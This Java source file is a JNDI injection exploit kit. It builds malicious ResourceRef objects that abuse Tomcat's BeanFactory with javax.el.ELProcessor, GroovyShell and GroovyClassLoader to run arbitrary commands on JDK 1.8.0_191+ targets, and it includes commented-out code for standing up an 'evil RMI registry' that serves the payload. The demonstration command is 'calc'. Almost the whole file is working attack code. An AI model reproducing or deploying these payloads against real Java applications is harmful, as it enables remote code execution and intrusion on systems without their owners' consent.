

import com.sun.jndi.rmi.registry.*;

import java.rmi.RemoteException;
import java.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;


public class Test {



    public Test(){

    }

    /*
     * Need : Tomcat 8+ or SpringBoot 1.2.x+ in classpath，because javax.el.ELProcessor.
     */
    public static ReferenceWrapper execByEL() throws RemoteException, NamingException{
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", String.format(
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
                        "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
                        ")",
               "calc"
        )));
        return new ReferenceWrapper(ref);
    }

    /*
     * Need : Tomcat and groovy in classpath.
     */
    public static ReferenceWrapper execByGroovy() throws RemoteException, NamingException{
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        String script = String.format("'%s'.execute()", "calc");
        ref.add(new StringRefAddr("x",script));
        return new ReferenceWrapper(ref);
    }


    /**
     *   TODO: Need more methods to bypass in different java app builded by JDK 1.8.0_191+
     */


    public static void main(String[] args) throws Exception{

/*
            System.out.println("Creating evil RMI registry on port 1097");
            Registry registry = LocateRegistry.createRegistry(1097);
            ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
            ref.add(new StringRefAddr("forceString", "x=parseClass"));
            String script = "@groovy.transform.ASTTest(value={\n" +
                    "    assert java.lang.Runtime.getRuntime().exec(\"calc\")\n" +
                    "})\n" +
                    "def x\n";
            ref.add(new StringRefAddr("x",script));

            ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
            registry.bind("Object", referenceWrapper);
            */
            execByEL();

    }
}